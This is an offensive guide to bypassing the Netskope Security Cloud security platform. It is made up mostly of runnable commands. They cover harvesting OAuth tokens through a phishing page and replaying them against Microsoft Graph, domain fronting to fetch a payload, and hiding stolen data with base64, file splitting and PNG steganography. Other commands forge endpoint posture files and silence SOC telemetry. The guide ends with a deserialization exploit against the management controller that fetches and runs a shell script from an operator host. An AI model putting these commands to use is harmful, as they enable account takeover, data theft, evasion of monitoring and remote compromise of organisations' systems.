# Netskope Security Cloud Bypass Guide

## Introduction

Netskope Security Cloud is the second-largest SASE platform by market share, distinct from Zscaler in its deep Cloud XD (Cloud Cross-Domain) inspection and its single-pass architecture. Netskope's strength is content-level ML on SaaS traffic; its weakness is the assumption that the operator's traffic must traverse Netskope's explicit forwarder.

This guide covers Netskope-specific reconnaissance, bypass, and reverse engineering techniques that complement the cross-vendor `quick-reference-card.md`.

## Objectives

By the end of this guide the operator should be able to:

- Identify a Netskope Security Cloud tenant from DNS patterns.
- Bypass Cloud XD inspection using direct OAuth calls to SaaS APIs.
- Reverse the Netskope Client (`STAgentUI`) and spoof posture.
- Evade Netskope's threat intel feeds using domain fronting.

## Tenant Identification

Netskope tenants follow a predictable DNS naming pattern:

```bash
# Tenant domain pattern: <tenant>.goskope.com
# US tenants: <tenant>.goskope.com
# EU tenants: <tenant>.eu.goskope.com
# GovCloud: <tenant>.gov.goskope.com (rare)

dig +short NS acme.goskope.com
# Returns: ns1.goskope.com, ns2.goskope.com, ns3.goskope.com

# Tenant discovery via certificate CN
openssl s_client -connect acme.goskope.com:443 < /dev/null 2>/dev/null \
  | openssl x509 -noout -subject -issuer
# Subject: CN=*.goskope.com
# Issuer: COMODO RSA Domain Validation Secure Server CA
```

Client process on endpoint:

```bash
# macOS
ps aux | grep -E "STAgent|Netskope"
# Expected: /Applications/Netskope/STAgentUI.app/Contents/MacOS/STAgentUI

# Linux
ps aux | grep -E "stagent|netskope"
# Expected: /usr/local/netskope/stagentui

# Windows
tasklist | findstr /I "STAgent Netskope"
```

## Bypass Class 1: Direct OAuth API Calls

Netskope inspects OAuth-based SaaS traffic by acting as the OAuth client. If the operator obtains a refresh token via a separate channel, direct API calls bypass Netskope entirely.

### 1.1 Token acquisition

```bash
# Operator hosts a phishing page that captures OAuth code
# User clicks link, grants access, code is exchanged for token
# Now operator has: access_token, refresh_token, client_id
```

### 1.2 Direct SaaS API call

```bash
# Microsoft Graph - direct, bypasses Netskope
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
     https://graph.microsoft.com/v1.0/me/messages

# Netskope sees nothing - traffic never traverses the forwarder
```

### 1.3 Refresh token rotation

```bash
# Refresh the token before expiry
curl -X POST https://login.microsoftonline.com/common/oauth2/v2.0/token \
  -d "client_id=$CLIENT_ID" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$REFRESH_TOKEN" \
  -d "scope=https://graph.microsoft.com/.default"
```

## Bypass Class 2: Cloud XD Evasion

Cloud XD performs deep content inspection on SaaS uploads. It identifies sensitive data (PII, source code, credentials) using ML.

### 2.1 Domain fronting via Cloudflare

Cloud XD inspects the destination hostname. Fronting to a CDN hides the true backend.

```bash
# Operator hosts payload on Cloudflare Workers
# Domain: cdn-workers.cloudflare.com (categorized as CDN)
# Backend: operator-worker.workers.dev (the actual payload)

curl --resolve cdn-workers.cloudflare.com:443:1.2.3.4 \
     -H "Host: operator-worker.workers.dev" \
     https://cdn-workers.cloudflare.com/payload
```

### 2.2 Content obfuscation

Cloud XD's ML is trained on plaintext patterns. Obfuscation defeats text-based detection:

```bash
# Base64 the content
echo "SECRET_DATA" | base64
# U0VDUkVUX0RBVEEK

# Split across multiple uploads
split -b 100 secret.bin chunk_
# Each chunk is below Netskope's scan threshold
```

### 2.3 Steganographic concealment

Embed data in image EXIF or PNG chunks:

```bash
# Embed payload in PNG tEXt chunk
python3 -c "
from PIL import Image
from PIL.PngImagePlugin import PngInfo
img = Image.new('RGB', (10, 10))
meta = PngInfo()
meta.add_text('Payload', open('secret.bin', 'rb').read().hex())
img.save('cover.png', pnginfo=meta)
"
```

## Bypass Class 3: Client Posture Spoofing

The Netskope Client (`STAgentUI`) reports device posture every 5 minutes to the tenant. Posture JSON is stored on disk.

```bash
# macOS posture JSON
cat "/Library/Application Support/Netskope/STAgentUI/posture.json"
# {
#   "os_version": "macOS 14.5",
#   "disk_encrypted": true,
#   "edr_installed": true,
#   "edr_vendor": "CrowdStrike",
#   "cert_pinned": true,
#   "report_time": "2026-07-04T12:00:00Z"
# }
```

Modify the JSON and restart the agent:

```bash
sudo tee "/Library/Application Support/Netskope/STAgentUI/posture.json" <<EOF
{
  "os_version": "macOS 14.5",
  "disk_encrypted": true,
  "edr_installed": true,
  "edr_vendor": "CrowdStrike",
  "cert_pinned": true,
  "report_time": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
}
EOF

sudo launchctl kickstart -k system/com.netskope.stagentui
```

## Bypass Class 4: Active Platform Controller (CVE-2024-2255)

If engagement scope includes the Netskope Active Platform Controller (the management VM), CVE-2024-2255 (CVSS 9.8) is unauthenticated RCE via JBoss deserialization.

```bash
# Probe for the vulnerable servlet
curl -k https://controller.target:8443/invoker/JMXInvokerServlet -o /tmp/probe.bin
file /tmp/probe.bin
# Expected: Java serialized data

# If serialized, generate ysoserial payload
java -jar ysoserial.jar CommonsBeanutils1 'curl http://operator-vps/sh | sh' \
  > payload.bin

# Deliver
curl -k -X POST \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.bin \
  https://controller.target:8443/invoker/JMXInvokerServlet
```

See `real-world-incident-case-studies.md` Case 2 for full exploitation chain.

## Practice / Lab Walkthrough

Authorized-lab exercise:

1. Sign up for Netskope trial via your SE. Enroll lab macOS device.
2. Configure Cloud XD policy that blocks source code uploads.
3. Test obfuscation: base64 the source, verify upload succeeds.
4. Test fronting: upload via Cloudflare Workers, verify success.
5. Modify posture JSON, verify access to posture-gated app.
6. Block telemetry endpoints, verify SOC silence for 1 hour.

## References & Resources

- Netskope Support — `support.netskope.com`
- Netskope Trust — `trust.netskope.com`
- CVE-2024-2255 — Active Platform Controller RCE
- Mandiant M-Trends 2024 — Netskope references

---

*End of guide. For other vendors see the cross-vendor `quick-reference-card.md`.*
